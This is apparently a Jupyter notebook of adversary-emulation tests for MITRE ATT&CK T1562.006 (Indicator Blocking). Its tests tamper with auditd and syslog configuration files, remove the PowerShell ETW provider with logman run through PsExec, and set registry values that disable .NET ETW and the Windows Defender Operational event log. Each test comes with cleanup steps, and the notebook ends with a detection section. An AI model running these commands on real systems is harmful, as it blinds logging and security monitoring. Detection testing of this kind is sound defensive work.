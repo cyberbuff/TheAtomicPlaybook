{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "9c3d1e0e",
   "metadata": {},
   "source": "# T1562.006 - Indicator Blocking\nAn adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting(Citation: Microsoft Lamin Sept 2017) or even disabling host-based sensors, such as Event Tracing for Windows (ETW)(Citation: Microsoft About Event Tracing 2018), by tampering settings that control the collection and flow of event telemetry.(Citation: Medium Event Tracing Tampering 2018) These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as [PowerShell](https://attack.mitre.org/techniques/T1059/001) or [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).\n\nFor example, adversaries may modify the `File` value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Security</code> to hide their malicious actions in a new or different .evtx log file. This action does not require a system reboot and takes effect immediately.(Citation: disable_win_evt_logging) \n\nETW interruption can be achieved multiple ways, however most directly by defining conditions using the [PowerShell](https://attack.mitre.org/techniques/T1059/001) <code>Set-EtwTraceProvider</code> cmdlet or by interfacing directly with the Registry to make alterations.\n\nIn the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products.\n\nIn Linux environments, adversaries may disable or reconfigure log processing tools such as syslog or nxlog to inhibit detection and monitoring capabilities to facilitate follow on behaviors (Citation: LemonDuck)."
  },
  {
   "cell_type": "markdown",
   "id": "90add639",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "44e38aa9",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Auditing Configuration Changes on Linux Host",
    "Emulates modification of auditd configuration files\n",
    "**Supported Platforms:** linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `bash`\n",
    "```bash\nsed -i '$ a #art_test_1562_006_1' /etc/audisp/audispd.conf\nif [ -f \"/etc/auditd.conf\" ];\nthen sed -i '$ a #art_test_1562_006_1' /etc/auditd.conf\nelse sed -i '$ a #art_test_1562_006_1' /etc/audit/auditd.conf\nfi \nsed -i '$ a #art_test_1562_006_1' /etc/libaudit.conf\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bc3f6a4e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "5d3fce88",
   "metadata": {},
   "source": "#### Cleanup: \n```bash\nsed -i '$ d' /etc/audisp/audispd.conf\nif [ -f \"/etc/auditd.conf\" ];\nthen sed -i '$ d' /etc/auditd.conf\nelse sed -i '$ d' /etc/audit/auditd.conf\nfi\nsed -i '$ d' /etc/libaudit.conf\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e350cd54",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "f94ec6cd",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Auditing Configuration Changes on FreeBSD Host",
    "Emulates modification of auditd configuration files\n",
    "**Supported Platforms:** linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\necho '#art_test_1562_006_1' >> /etc/security/audit_event\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6553d8e9",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "2a0da23f",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nsed -i \"\" '/#art_test_1562_006_1/d' /etc/security/audit_event\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c6ccb162",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "b757670d",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - Logging Configuration Changes on Linux Host",
    "Emulates modification of syslog configuration.\n",
    "**Supported Platforms:** linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `bash`\n",
    "```bash\nif [ -f \"/etc/syslog.conf\" ];\nthen sed -i '$ a #art_test_1562_006_2' /etc/syslog.conf\nfi\nif [ -f \"/etc/rsyslog.conf\" ];\nthen sed -i '$ a #art_test_1562_006_2' /etc/rsyslog.conf\nfi\nif [ -f \"/etc/syslog-ng/syslog-ng.conf\" ];\nthen sed -i '$ a #art_test_1562_006_2' /etc/syslog-ng/syslog-ng.conf\nfi\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8a2a9c28",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "611fe885",
   "metadata": {},
   "source": "#### Cleanup: \n```bash\nif [ -f \"/etc/syslog.conf\" ];\nthen sed -i '$ d' /etc/syslog.conf\nfi\nif [ -f \"/etc/rsyslog.conf\" ];\nthen sed -i '$ d' /etc/rsyslog.conf\nfi\nif [ -f \"/etc/syslog-ng/syslog-ng.conf\" ];\nthen sed -i '$ d' /etc/syslog-ng/syslog-ng.conf\nfi\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "817307ae",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "35506fe1",
   "metadata": {},
   "source": [
    "### Atomic Test #4 - Logging Configuration Changes on FreeBSD Host",
    "Emulates modification of syslog configuration.\n",
    "**Supported Platforms:** linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nif [ -f \"/etc/syslog.conf\" ];\nthen echo '#art_test_1562_006_2' >> /etc/syslog.conf\nfi\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1b6a3425",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "12d80211",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nif [ -f \"/etc/syslog.conf\" ];\nthen sed -i \"\" '/#art_test_1562_006_2/d' /etc/syslog.conf\nfi\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "777f8644",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "eb8a96af",
   "metadata": {},
   "source": "### Atomic Test #5 - Disable Powershell ETW Provider - Windows\nThis test was created to disable the Microsoft Powershell ETW provider by using the built-in Windows tool, logman.exe. This provider is used as a common source of telemetry in AV/EDR solutions.\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: PSExec must be installed on the machine.\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\pstools\\PsExec.exe\") {exit 0} else {exit 1}\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PStools.zip\"\nexpand-archive -literalpath \"PathToAtomicsFolder\\..\\ExternalPayloads\\PStools.zip\" -destinationpath \"PathToAtomicsFolder\\..\\ExternalPayloads\\pstools\" -force\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "47b8de88",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 5 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "d7fc5219",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\ncmd /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\pstools\\PsExec.exe\" -accepteula -i -s cmd.exe /c logman update trace \"EventLog-Application\" --p \"Microsoft-Windows-Powershell\" -ets```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8311071d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "ab268ff4",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\ncmd /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\pstools\\PsExec.exe\" -i -s cmd.exe /c logman update trace \"EventLog-Application\" -p \"Microsoft-Windows-Powershell\" -ets```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "08bdbd2d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 5 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "a46220e8",
   "metadata": {},
   "source": [
    "### Atomic Test #6 - Disable .NET Event Tracing for Windows Via Registry (cmd)",
    "Disables ETW for the .NET Framework using the reg.exe utility to update the Windows registry",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nREG ADD HKLM\\Software\\Microsoft\\.NETFramework /v ETWEnabled /t REG_DWORD /d 0```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e6bf6d8d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "b3193304",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nREG DELETE HKLM\\Software\\Microsoft\\.NETFramework /v ETWEnabled /f > nul 2>&1```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "15cb97b8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 6 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "c9e8f4e5",
   "metadata": {},
   "source": [
    "### Atomic Test #7 - Disable .NET Event Tracing for Windows Via Registry (powershell)",
    "Disables ETW for the .NET Framework using PowerShell to update the Windows registry",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nNew-ItemProperty -Path HKLM:\\Software\\Microsoft\\.NETFramework -Name ETWEnabled -Value 0 -PropertyType \"DWord\" -Force```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "965a4fb2",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "882c20f3",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nREG DELETE HKLM\\Software\\Microsoft\\.NETFramework /v ETWEnabled /f > $null 2>&1```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "33cdab59",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 7 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "46b7c10a",
   "metadata": {},
   "source": [
    "### Atomic Test #8 - LockBit Black - Disable the ETW Provider of Windows Defender -cmd",
    "An adversary can disable the ETW Provider of Windows Defender,\nso nothing would be logged to Microsoft-Windows-Windows-Defender/Operational anymore.\nhttps://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/Operational\" /v Enabled /t REG_DWORD /d 0 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6a4238f5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 8"
  },
  {
   "cell_type": "markdown",
   "id": "040f2c8b",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/Operational\" /v Enabled /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "558e488d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 8 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "a3a41b03",
   "metadata": {},
   "source": [
    "### Atomic Test #9 - LockBit Black - Disable the ETW Provider of Windows Defender -Powershell",
    "An adversary can disable the ETW Provider of Windows Defender,\nso nothing would be logged to Microsoft-Windows-Windows-Defender/Operational anymore.\nhttps://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nNew-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/Operational\" -Name Enabled  -PropertyType DWord -Value 0 -Force\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3f9dc7ba",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 9"
  },
  {
   "cell_type": "markdown",
   "id": "bd374c6c",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/Operational\" -Name Enabled -Force -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "37fe3dae",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 9 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "15c73262",
   "metadata": {},
   "source": "## Detection\nDetect lack of reported activity from a host sensor. Different methods of blocking may cause different disruptions in reporting. Systems may suddenly stop reporting all data or only certain kinds of data.\n\nDepending on the types of host information collected, an analyst may be able to detect the event that triggered a process to stop or connection to be blocked. For example, Sysmon will log when its configuration state has changed (Event ID 16) and Windows Management Instrumentation (WMI) may be used to subscribe ETW providers that log any provider removal from a specific trace session. (Citation: Medium Event Tracing Tampering 2018) To detect changes in ETW you can also monitor the registry key which contains configurations for all ETW event providers: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\AUTOLOGGER_NAME\\{PROVIDER_GUID}</code>"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}